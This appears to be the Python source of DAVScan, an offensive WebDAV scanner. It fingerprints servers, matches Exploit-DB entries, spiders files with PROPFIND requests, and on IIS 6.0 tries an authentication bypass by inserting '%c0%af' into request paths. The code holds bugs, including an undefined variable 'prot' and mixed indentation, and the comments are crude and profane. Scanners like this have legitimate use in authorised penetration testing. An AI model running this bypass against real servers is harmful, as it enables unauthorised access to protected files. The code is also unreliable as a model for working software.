#!/usr/bin/python
########################################################################################################################################
# DAVScan v0.5 (Codename: Cobra Whiskey.)
#
# Written by: Graph-X (@graphx)
#	e-mail: graphx@sigaint.org
# 
# Description:
#	DAVScan is a quick and lightweight webdav scanner designed to discover hidden files and folders on DAV enabled webservers.
#	The scanner works by taking advantage of overly privileged/misconfigured WebDAV servers or servers vulnerable to various 
#	disclosure or authentication bypass vulnerabilities. The scanner attempts to fingerprint the target server and then spider
#	the server based on the results of a root PROPFIND request.
# 
# Requirements: 
#	Nothing
# 
# TODO:
#	
#	get ASP and PHP exploit results working
#	make the dav scanner smart enough to not attempt IIS auth bypass unless server is IIS
#	Bunch of other shit most likely.  I'm just happy it doesn't shit the bed when I run it with just the -H flag.	
#
# Totally Legit License Shit:
#############################################################################################################################################
##
##									#YOLO Public License (YPL) v0.12.34-hunter.2
## This software is provided as is and free of charge.  It can be redesigned, redistributed,
## refrigerated, remade, reheated, and regifted in part or in whole by any person, corporation, rodent, or wet floor sign
## for fun or profit or hookers and blow. Marsupials, and all other inanimate objects are prohibited from using this software.
## In exchange, just give me credit for inspiring you to steal my code like Carlos Mencia steals jokes.  I steal a bunch too so you're
## probably just getting sloppy seconds anyways. Shout out to Stack Exchange/Overflow for giving me help via shitty code snippets whenever 
## I got stuck.
##
## Keep in mind I'm not a dev and can barely write good English let alone good code.  This software is likely buggy as hell 
## and is provided AS IS with no warranty real, imagined, fabricated, fornicated or pulled from a magic hat that this software is 
## suitable for any purpose, porpise, or tortise, unless it's also a florist.  To be honest, you probably should not even use this in any
## environment you want to have working right.
##
## Basically you can't sue me if you decide to use this code that I'm putting out there for free and it breaks shit  I'm just as broke as this
## code and you'll just be pissing into the wind on that endeavor.  I already warned you that my code is bad.  Read through it and make sure
## you know what it does, or have your cousin that took a web design class in high school help you figure out what it does.  
##
## ...Or just take my word for it and wing it. #YOLO
##
#############################################################################################################################################

import base64
import sqlite3
import requests
import argparse
import sys
import os.path
from urlparse import urlparse

# below imports are a part of davscan
import fingerprinter
import dav

###############################################################
#
# Colors - Making shit pretty since the birth of the universe
#
###############################################################
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	
	def disable(self):
		self.HEADER = ''
		self.OKBLUE = ''
		self.OKGREEN = ''
		self.WARNING = ''
		self.FAIL = ''
		self.ENDC = ''
		
#############################################################################################
# Main function:
#
# Does a whole bunch of stuff.  Calls this and that maybe does some other things.
# Who knows really what this does.  Does anyone really know their purpose in life?
# Why would we expect this function to truly know its purpose?!  You're an inconsiderate
# prick.  You know that buddy?  How bout you fuck off and go play in traffic or something!
#
#############################################################################################
def main():
	sess = requests.Session() #see that? It's a capital S.  Punctuation bitches!
        args = get_args()
	
        #assign variables
	url = args.url
	auth = args.auth
	user = args.user
	pswd = args.password
	outfile = args.outfile
	dos = args.dos
	msf = args.msf
	unichar = "%c0%af"

	# disable cert verification automatically because that just breaks shit.
        sess.verify = False
	#pretty pandas up in huuurrrr
	banner()

	#cut the url up like a hooker that stole some blow. You know what I'm talking about, Mikey. 
        purl = urlparse(url)
        host = purl.netloc
        sess.headers = {'Host': purl.netloc}

        #if outfile exists we append otherwise write
	if os.path.exists(outfile):
		o = open(outfile, "a")
	else:
		o = open(outfile, "w+")
	#set the auth header if needed
	if auth is not None:
		authstring = "%s:%s" % (user, pswd)
		encodedstring = base64.b64encode(authstring)
		sess.headers.update({'Authorization': 'Basic %s' % encodedstring})
	else:
		#just clearing out unused args
		user = None
		pswd = None
	
	f = fingerprinter.fingerprint(sess,purl,msf,dos) 
	server = f.get('Server', "No Server Header")
	davEnabled = f.get('WebDAV', 'Unknown')
	#clean up crap keys
	f.pop('Exploit Title')
	f.pop('')
	directory = ""
	if server == "IIS/6.0" and davEnabled == "Enabled":
		dabp = True
	else:
		dabp = False
	#Start building our file (eventually a database)
	## con = sqlite3.connect(outfile + '.db')
	## db_setup(conn)
        
	with o as i:
		## conn = sqlite3.connect(outfile + '.db')
	##if db_setup(conn):
		i.write(bcolors.HEADER + "[*]==================={Server Fingerprint}===================[*] \n" + bcolors.ENDC)
		i.write(bcolors.HEADER + "[*] Server: " + server  + "\n" + bcolors.ENDC)
		i.write(bcolors.HEADER + "[*] WebDAV: " + davEnabled + "\n" + bcolors.ENDC)
		i.write(bcolors.HEADER + "[*] WebDAV Auth Bypass: " + str(dabp) + "\n" + bcolors.ENDC)
		i.write(bcolors.HEADER + "[*]==================={Exploit-DB Exploits}==================[*] \n" + bcolors.ENDC)
		for k,v in f.iteritems():
                        if k == "Server" or k == "WebDAV":
                            next
                        else:
			    i.write(bcolors.OKGREEN + "[+]" + bcolors.ENDC + " %s ==> %s \n" % (k, v)  )
		i.write(bcolors.HEADER + "[*]===================={~Server Mapping~}====================[*] \n" + bcolors.ENDC)
		if davEnabled == "Enabled":
			sess.headers.update({'Depth': 'infinity', 'Content-Type': 'application/xml', 'Translate': 'f'})
                        client = dav.Client()
                        r = client.propfind(sess,url)
                        if r != 403:
			    for file in r:
			    	if file[1] == 0 and file[2].split(' ')[2] == "OK":
				    fname = file[0].split('/')[-2]
				    directory = directory + "/" + fname
				    fname = directory
				else:
				    fname = file[0].split('/')[-1]
				status = file[2].split(' ')[2]
				size = str(file[1])
				if status == "OK":
					i.write(bcolors.OKGREEN + "[+] " + fname + "  " + status + "  " + size + "\n" + bcolors.ENDC)
				else:
				
					i.write(bcolors.WARNING + "[-] " + fname + "  " + bcolors.FAIL + status + bcolors.WARNING + "  " + size + "\n" + bcolors.ENDC)
                                        if dabp == True:
					    f = file[0].split('/')[3:]
					    d = len(f) -1
					    if d != 0:
						    url = prot + "://" + host + "/" + f[0][:2] + "%c0%af" + f[0][2:]
						    n = 1
						    while n != d:
							    url = url + "/" + f[n]
							    n = n + 1
						    url = url + "/" + fname
					    print("[!!] " + url)
					    response = client.get(sess,url)
					    if response.status_code == 200:
					        i.write(bcolors.OKGREEN + "[+] " + fname + "  OK  DAV Auth Bypass Worked!! \n" + bcolors.ENDC)
					    else:
					        i.write(bcolors.FAIL + "[!] Webserver does not appear vulnerable to DAV auth bypass \n" + bcolors.ENDC)
                                        else:
                                            i.write(bcolors.WARNING + "[-] Webserver doesn't appear to be IIS 6.0. Skipping auth bypass attempt. \n" + bcolors.ENDC)
                        else:
                            i.write(bcolors.FAIL + "[!] Unable to access WebDAV, server is restricting access\n" + bcolors.ENDC)
					
						
		else:
			i.write(bcolors.FAIL +  "[-] WebDAV is not enabled.  Unable to map server. \n" + bcolors.ENDC)
		i.close()
def banner():
	print(bcolors.HEADER + "\n \
	[*]===========================================================[*]\n \
	[*]	 		  Davscan v0.5 (cobra whiskey)	      [*]\n \
	[*]	 	       Written by Graph-X	   	      [*]\n \
	[*]	 	  e-mail: graphx@sigaint.org 		      [*]\n \
	[*]  	   	       twitter: @graphx  		      [*]\n \
	[*]===========================================================[*]\n \
	" + bcolors.ENDC)
################################################################
# get_args function:
#	Uses the arg parser to collect command line arguments
#
#	Requires none
#
#	Returns "args" as list of arguments	
################################################################
def get_args():
	parser = argparse.ArgumentParser()
        parser.add_argument('url', type=str, action='store', help="url of the server to scan; https://foo.com:8443/")
	parser.add_argument('-a', '--auth', dest='auth', default=None, help="Basic authentication required; -a basic", required=False)
	parser.add_argument('-u', '--user', dest='user', default=None, help="user; -u derpina", required=False)
	parser.add_argument('-P', '--password', dest='password', default=None, help="password; -P 'P@$$W0rd'", required=False)
	parser.add_argument('-o', '--out', dest='outfile', default='/tmp/davout', help="output file.  defaults to; -o /tmp/davout", required=False)
	parser.add_argument('-d', '--no-dos', dest='dos', action='store_true', help="exclude DoS modules", required=False)
	parser.add_argument('-m', '--no-msf', dest='msf', action='store_true', help="exclude MSF modules from results", required=False)
	args = parser.parse_args()
        #yeah I know this sloppy but what do you want for nothing?  A rubber biscuit?! ..bow bow bow
        if len(args.url) < 10:
            print(bcolors.WARNING + "[!] Invalid or missing URL" + bcolors.ENDC)
            parser.print_help()
            sys.exit(2)
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(2)
	else:
		return args

####################################################
# db_setup function:
#
#	This function does initial setup of the sqlite3 database for the scanner.  
#	 TODO: Confirm no changes to the schema are needed for the parsed DAV responses
#
#	requires sqllite3 information as "conn"
##########################################################################################
def db_setup(conn):
	cur = conn.cursor()
	#create file table
	cur.execute("create table files(name, size, status, contenttype, path)")
	cur.execute("create table server(hostname, os, server, powered-by, version)")
	cur.execute("create table exploits(name, exploit-db, attempted, successful)")

if __name__ == "__main__":
   main()
   
